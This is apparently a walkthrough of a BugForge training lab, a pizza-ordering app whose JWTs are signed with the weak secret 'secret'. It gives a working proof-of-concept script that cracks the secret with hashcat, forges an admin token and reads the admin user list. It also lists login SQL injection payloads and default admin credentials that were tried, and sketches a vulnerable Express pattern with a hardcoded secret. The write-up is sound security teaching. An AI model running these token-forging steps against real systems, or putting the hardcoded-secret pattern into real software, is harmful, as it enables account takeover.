# cheesy-007 - BugForge Lab Walkthrough

**URL:** https://lab-1785661290168-qttie8.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Broken Authentication - JWT signed with a weak, guessable HS256 secret
**Flag:** `bug{jMU2SvOQebuTSZqGnL3yppWhYjln6i1A}`

---

## Summary

Cheesy Does It is a pizza-ordering SPA that issues JWTs on registration/login and uses a `role`
claim embedded directly in the token payload to gate admin routes. The server signs tokens with
a common, dictionary-guessable HS256 secret. Cracking the secret offline lets an attacker forge a
token for any user, including `role: "admin"`, and read the admin user list.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- JWT auth (HS256, `role` claim in the payload, no `exp`)
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/login` | POST | No | Returns a JWT |
| `/api/verify-token` | GET | JWT | Returns the decoded user record for the presented token |
| `/api/admin/users` | GET | JWT + admin role | **Vulnerable** - trusts the `role` claim from any correctly-signed token |

---

## Discovery

### Step 1 - Register and inspect the token

Registration returns a usable JWT directly:

```
POST /api/register {"username":"pentestXXXX","email":"...","password":"Password123!"}
-> {"token": "...", "user": {"id":11, "role":"user"}}
```

Decoding the JWT payload (base64url, no verification needed to read it) shows the shape:

```json
{"id":11,"username":"pentestXXXX","role":"user","iat":1785661631}
```

The `role` claim lives directly in the token, and the header is `{"alg":"HS256","typ":"JWT"}`, so
an `alg:none` downgrade was not applicable here. That leaves the signing secret itself as the
target.

### Step 2 - Rule out the classic auth bugs for this app family

This app family reuses the same pizza-ordering theme across many distinct instances, so each
known bug class was checked directly rather than assumed:

- Default admin creds (`admin:admin123`, `admin:admin`, `admin:password`) against `/api/login`
  -> no token returned in any case.
- SQLi in the login form (`' OR 1=1--`, `' OR '1'='1`, `admin'--`) -> `400` on every attempt.
  Parameterized queries, not injectable.
- Mass assignment of `role: "admin"` on `/api/register` -> account created, but
  `GET /api/verify-token` confirmed the role stayed `"user"`. The field is silently ignored
  server-side.

All patched. The token's signature was the remaining angle.

### Step 3 - Crack the signing secret

Wrote the raw JWT to a file and ran it through hashcat's dedicated JWT mode against `rockyou.txt`:

```
hashcat -m 16500 -a 0 jwt.txt rockyou.txt --potfile-disable -o cracked.txt
```

Cracked in under a second:

```
<jwt>:secret
```

The signing secret is the literal string `secret`.

### Step 4 - Forge an admin token

With the secret known, forged a fresh HS256 token with an admin payload:

```python
import jwt
token = jwt.encode(
    {"id": 1, "username": "admin", "role": "admin", "iat": 1785661631},
    "secret",
    algorithm="HS256",
)
```

`GET /api/verify-token` with the forged token confirmed the server accepted it and returned the
real admin account (`id: 1, username: "admin", role: "admin"`).

### Step 5 - Hit the admin endpoint

```
GET /api/admin/users
Authorization: Bearer <forged token>

-> 200 OK
   X-Flag: bug{jMU2SvOQebuTSZqGnL3yppWhYjln6i1A}
   [{"id":1,"username":"admin",...}, ...]
```

The flag is delivered in the `X-Flag` response header, not the JSON body.

---

## Proof of Concept

```bash
BASE="https://lab-1785661290168-qttie8.labs-app.bugforge.io"

# 1. Register to get a sample token
TOKEN=$(curl -s -X POST "$BASE/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"pentestXXXX","email":"pentestXXXX@bugforge.io","password":"Password123!"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "$TOKEN" > jwt.txt

# 2. Crack the HS256 secret offline
hashcat -m 16500 -a 0 jwt.txt rockyou.txt --potfile-disable -o cracked.txt
# -> ...:secret

# 3. Forge an admin token
FORGED=$(python3 -c "
import jwt
print(jwt.encode({'id':1,'username':'admin','role':'admin','iat':1785661631}, 'secret', algorithm='HS256'))
")

# 4. Read admin data, flag is in the X-Flag response header
curl -s -D - "$BASE/api/admin/users" -H "Authorization: Bearer $FORGED" | grep -i x-flag
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Default admin creds (`admin:admin123`, `admin:admin`, `admin:password`) | No token returned | Not vulnerable in this instance |
| Login-form SQLi (`' OR 1=1--`, `' OR '1'='1`, `admin'--`) | `400` on every payload | Parameterized queries |
| Mass assignment of `role:"admin"` on `/api/register` | Account created, role silently stayed `"user"` | Field ignored server-side |
| `alg:none` downgrade | Not attempted after confirming `HS256` in the header | Only relevant when the header can be swapped and the verifier accepts `none` |

---

## Root Cause

The server signs and verifies JWTs with a hardcoded, dictionary-guessable HS256 secret instead of
a long, randomly generated value pulled from a secrets manager or environment variable with
sufficient entropy. Because the `role` claim lives directly in the token payload with no
additional server-side authorization check against the database, recovering the secret is
equivalent to a full privilege escalation to any account, including admin:

```javascript
// Vulnerable pattern (approximate)
const JWT_SECRET = "secret"; // hardcoded, weak, guessable

app.post("/api/register", (req, res) => {
  const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET);
  res.json({ token, user });
});

app.get("/api/admin/users", authenticate, requireAdmin, (req, res) => {
  // requireAdmin only checks req.user.role from the verified JWT payload
  res.json(getAllUsers());
});
```

---

## CWE / OWASP

- **CWE-798**: Use of Hard-coded Credentials
- **CWE-326**: Inadequate Encryption Strength (weak signing key)
- **OWASP API Top 10 API2:2023** - Broken Authentication
